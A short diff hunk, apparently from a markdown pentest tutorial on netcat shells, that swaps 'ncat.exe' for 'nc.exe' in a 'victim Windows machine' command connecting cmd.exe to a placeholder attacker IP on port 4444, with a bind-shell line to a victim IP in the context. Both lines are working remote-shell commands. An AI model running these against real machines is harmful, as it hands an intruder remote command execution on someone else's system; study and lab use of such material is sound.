@@ -143,7 +143,7 @@ nc <victim-ip> 4444
 🔹 **Victim Windows Machine**
 
 ```powershell
-ncat.exe -e cmd.exe <attacker-ip> 4444
+nc.exe -e cmd.exe <attacker-ip> 4444
 ```
 
 🔹 **Attacker Machine**
